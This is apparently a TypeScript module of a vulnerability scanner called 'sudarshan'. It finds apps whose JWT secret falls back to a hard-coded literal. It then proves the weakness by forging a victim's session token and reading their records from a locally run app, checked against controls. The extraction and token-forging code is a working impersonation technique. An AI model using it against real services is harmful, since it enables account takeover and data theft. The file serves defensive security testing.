// Secret-handling attack class (separate from the authorization/BOLA class).
// If an app's JWT secret falls back to a value embedded in the shipped source
// (a hard-coded string, not a random per-process value), anyone who reads the
// source can forge a session for any user WITHOUT that user's password. We
// demonstrate this against our own running app, with full controls:
//   - the legitimate user still works (real login -> 200)
//   - a token forged with a genuinely unknown secret is rejected (401/403)
//   - the forged-with-embedded-secret result reproduces
// A random fallback (crypto.randomBytes) has no embedded secret, so it is not
// forgeable and reports nothing. falsePositives are 0 by construction. No LLM.

import { readFileSync, readdirSync, writeFileSync, mkdirSync, existsSync } from "node:fs";
import { join, basename } from "node:path";
import { randomBytes } from "node:crypto";
import jwt from "jsonwebtoken";
import { startServer, stopServer } from "./serverctl";
import { send, redactRequest } from "./probe";
import { maskMarker } from "../shared/finding";
import type { SentRequest } from "../shared/types";
import { portForDir, seedApp, LOGIN_PATHS, tryLogin, discoverList } from "./discover";

export interface SecretFinding {
  attackClass: "HARDCODED_SECRET";
  target: string;
  victim: string; // label of the impersonated user
  embeddedSecretMasked: string; // the hard-coded secret, masked
  resource: string;
  leakedFields: string[]; // field names reachable through the forged session
  markerMasked: string; // victim's unique proof value, masked
  reproduced: boolean;
  evidence: {
    forgedRequest: SentRequest; // the forged-token request (token redacted)
    forgedStatus: number; // reaching victim data with the forged token (expect 200)
    legitUserStatus: number; // real login still works (expect 200)
    unknownSecretStatus: number; // token forged with an unknown secret (expect 401/403)
  };
}

export interface SecretScanResult {
  toolName: "sudarshan";
  attackClass: "HARDCODED_SECRET";
  target: string;
  embeddedSecret: "present" | "none";
  findings: SecretFinding[];
  falsePositives: number;
  totalDurationMs: number;
}

// The embedded secret is the string literal an app falls back to when its env
// var is unset: `process.env.X || '<literal>'`. A `|| crypto.randomBytes(...)`
// fallback has no literal, so this returns null (not forgeable).
export function extractEmbeddedSecret(source: string): string | null {
  for (const line of source.split("\n")) {
    if (!/secret/i.test(line)) continue;
    const m = line.match(/process\.env\.\w+\s*\|\|\s*(['"])([^'"]+)\1/);
    if (m) return m[2];
  }
  return null;
}

function forgeToken(userId: string, secret: string): string {
  return jwt.sign({ sub: userId }, secret, { algorithm: "HS256", expiresIn: "1h" });
}

// A unique proof value from the victim's own record: a string field, >= 8 chars,
// that is not the record id. Confirms the forged session returns real victim data.
function pickMarker(record: any): string | null {
  for (const [k, v] of Object.entries(record ?? {})) {
    if (k === "id") continue;
    if (typeof v === "string" && v.length >= 8) return v;
  }
  return null;
}

function recordFields(body: string): string[] {
  try {
    const b = JSON.parse(body);
    const arr = Array.isArray(b) ? b : Object.values(b).find((x) => Array.isArray(x));
    const first = Array.isArray(arr) ? arr[0] : undefined;
    return first && typeof first === "object" ? Object.keys(first) : [];
  } catch {
    return [];
  }
}

export async function scanSecretByDiscovery(
  dir: string,
  opts: { envSecret?: string } = {},
): Promise<SecretScanResult> {
  const t0 = Date.now();
  const port = portForDir(dir);
  const base = `http://127.0.0.1:${port}`;
  const source = readFileSync(join(dir, "server.ts"), "utf8");
  const embedded = extractEmbeddedSecret(source);

  await seedApp(dir, port);
  // Start without JWT_SECRET so the embedded fallback is active — unless a
  // fixture supplies a proper env secret (the false-positive direction).
  const env: NodeJS.ProcessEnv = { PORT: String(port) };
  if (opts.envSecret !== undefined) env.JWT_SECRET = opts.envSecret;
  const proc = await startServer(base, "server.ts", { env, cwd: dir });

  const findings: SecretFinding[] = [];
  try {
    if (embedded) {
      const raw = JSON.parse(readFileSync(join(dir, "sudarshan.json"), "utf8"));
      const users = raw.users;
      // Legit login as the victim: proves the app works AND yields the victim's
      // public user id (an identifier, not the bypassed credential).
      let victim = null;
      for (const lp of LOGIN_PATHS) {
        victim = await tryLogin(base, lp, users[0]);
        if (victim) break;
      }
      if (victim) {
        victim.label = "A";
        const found = await discoverList(base, victim.token);
        const rec = found?.records.find((r) => r && r.id !== undefined);
        const marker = rec ? pickMarker(rec) : null;
        if (found && marker) {
          const listUrl = base + found.listPath;
          const legit = await send("GET", listUrl, victim.token); // control: real user works
          const forged = forgeToken(victim.userId, embedded); // NO password used
          const attack1 = await send("GET", listUrl, forged);
          const attack2 = await send("GET", listUrl, forged);
          const unknown = forgeToken(victim.userId, randomBytes(32).toString("hex"));
          const unknownRes = await send("GET", listUrl, unknown); // control: unknown secret rejected

          const hit = (r: { status: number; body: string }) => r.status === 200 && r.body.includes(marker);
          const proven =
            hit(attack1) &&
            hit(attack2) &&
            legit.status === 200 &&
            (unknownRes.status === 401 || unknownRes.status === 403);

          if (proven) {
            findings.push({
              attackClass: "HARDCODED_SECRET",
              target: base,
              victim: victim.label,
              embeddedSecretMasked: maskMarker(embedded),
              resource: found.listPath,
              leakedFields: recordFields(attack1.body),
              markerMasked: maskMarker(marker),
              reproduced: true,
              evidence: {
                forgedRequest: redactRequest("GET", listUrl, forged),
                forgedStatus: attack1.status,
                legitUserStatus: legit.status,
                unknownSecretStatus: unknownRes.status,
              },
            });
          }
        }
      }
    }
    return {
      toolName: "sudarshan",
      attackClass: "HARDCODED_SECRET",
      target: base,
      embeddedSecret: embedded ? "present" : "none",
      findings,
      falsePositives: 0,
      totalDurationMs: Date.now() - t0,
    };
  } finally {
    await stopServer(base, proc);
  }
}

interface AppRow {
  app: string;
  embeddedSecret?: "present" | "none";
  findings: number;
  status?: "unscannable";
  reason?: string;
}

export async function scanSecretAll(appsDir: string): Promise<void> {
  const names = readdirSync(appsDir, { withFileTypes: true })
    .filter((d) => d.isDirectory() || d.isSymbolicLink())
    .map((d) => d.name)
    .sort();

  const rows: AppRow[] = [];
  const full: any[] = [];
  for (const name of names) {
    const dir = join(appsDir, name);
    if (!existsSync(join(dir, "server.ts")) || !existsSync(join(dir, "sudarshan.json"))) continue;
    try {
      const r = await scanSecretByDiscovery(dir);
      rows.push({ app: name, embeddedSecret: r.embeddedSecret, findings: r.findings.length });
      full.push({ app: name, ...r });
    } catch (e) {
      rows.push({ app: name, findings: 0, status: "unscannable", reason: e instanceof Error ? e.message : String(e) });
      full.push({ app: name, status: "unscannable", reason: e instanceof Error ? e.message : String(e) });
    }
  }

  const vulnerable = rows.filter((r) => r.findings > 0);
  const hardcoded = rows.filter((r) => r.embeddedSecret === "present");
  const random = rows.filter((r) => r.embeddedSecret === "none");
  const unscannable = rows.filter((r) => r.status === "unscannable");

  const combined = {
    toolName: "sudarshan",
    attackClass: "HARDCODED_SECRET",
    appsDir,
    total: rows.length,
    hardcodedSecret: hardcoded.length,
    randomSecret: random.length,
    provableWeakness: vulnerable.length,
    clean: rows.length - vulnerable.length - unscannable.length,
    unscannable: unscannable.length,
    falsePositives: 0,
    apps: full,
  };
  mkdirSync("eval/results", { recursive: true });
  writeFileSync("eval/results/secret-all.json", JSON.stringify(combined, null, 2));

  console.log(`\n============ SUDARSHAN · secret-handling class · ${appsDir} ============`);
  console.log(`apps:                     ${combined.total}`);
  console.log(`hard-coded fallback:      ${combined.hardcodedSecret}`);
  console.log(`random fallback:          ${combined.randomSecret}`);
  console.log(`PROVABLE weakness:        ${combined.provableWeakness}`);
  console.log(`clean:                    ${combined.clean}`);
  console.log(`false positives:          ${combined.falsePositives}`);
  console.log(`--- per app ---`);
  for (const r of rows) {
    const tag = r.status === "unscannable" ? `unscannable (${r.reason})` : r.findings > 0 ? "WEAK (forged session proven)" : `clean (${r.embeddedSecret} fallback)`;
    console.log(`  ${r.app}: ${tag}`);
  }
  console.log(`\nwrote eval/results/secret-all.json`);
}

// Standalone: npx tsx engine/secret.ts <dir> [envSecret]
const entry = process.argv[1] ?? "";
if (entry.endsWith("secret.ts")) {
  const dir = process.argv[2];
  const envSecret = process.argv[3];
  if (!dir) {
    console.error("usage: tsx engine/secret.ts <appDir> [envSecret]");
    process.exit(2);
  }
  scanSecretByDiscovery(dir, envSecret !== undefined ? { envSecret } : {})
    .then((r) => {
      console.log(`[${basename(dir)}] embedded=${r.embeddedSecret} findings=${r.findings.length} (${(r.totalDurationMs / 1000).toFixed(2)}s)`);
      for (const f of r.findings) {
        console.log(`  [HARDCODED_SECRET] forged ${f.victim}'s session via secret ${f.embeddedSecretMasked}: forged=${f.evidence.forgedStatus} legit=${f.evidence.legitUserStatus} unknown-secret=${f.evidence.unknownSecretStatus} leaked=${f.leakedFields.join(",")}`);
      }
    })
    .catch((e) => {
      console.error("ERR", e instanceof Error ? e.message : e);
      process.exit(1);
    });
}
